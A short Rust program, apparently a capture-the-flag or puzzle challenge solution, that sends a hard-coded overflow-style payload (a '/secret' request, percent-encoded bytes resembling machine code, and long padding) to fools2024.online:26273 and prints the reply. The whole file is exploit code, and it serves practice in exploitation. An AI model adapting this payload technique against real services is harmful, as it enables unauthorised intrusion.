use std::io::prelude::*;
use std::net::TcpStream;

const PAYLOAD: [u8; 0x325] = [
    0x0A, 0x2F, 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x00, 0x25, 0x31, 0x31, 0x25, 0x30, 0x30, 0x25,
    0x44, 0x32, 0x25, 0x32, 0x31, 0x25, 0x45, 0x41, 0x25, 0x30, 0x33, 0x25, 0x37, 0x30, 0x25, 0x43,
    0x33, 0x25, 0x45, 0x38, 0x25, 0x30, 0x31, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79,
    0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61,
    0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79,
    0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61,
    0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79,
    0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61,
    0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79,
    0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61,
    0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79,
    0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61,
    0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79,
    0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61,
    0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75,
    0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69,
    0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B,
    0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72,
    0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75,
    0x72, 0x75, 0x79, 0x69, 0x61, 0x4B, 0x75, 0x72, 0x75, 0x79, 0x69, 0x25, 0x30, 0x30, 0x25, 0x44,
    0x41, 0x0D, 0x0A, 0x0D, 0x0A,
];

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("fools2024.online:26273")?;
    let mut buffer = [0; 1024];

    let write_len = stream.write(&PAYLOAD)?;
    println!("Wrote {} bytes", write_len);

    let read_len = stream.read(&mut buffer)?;
    println!("Read {} bytes", read_len);

    println!("Response: {:?}", String::from_utf8_lossy(&buffer[..read_len]));
    Ok(())
}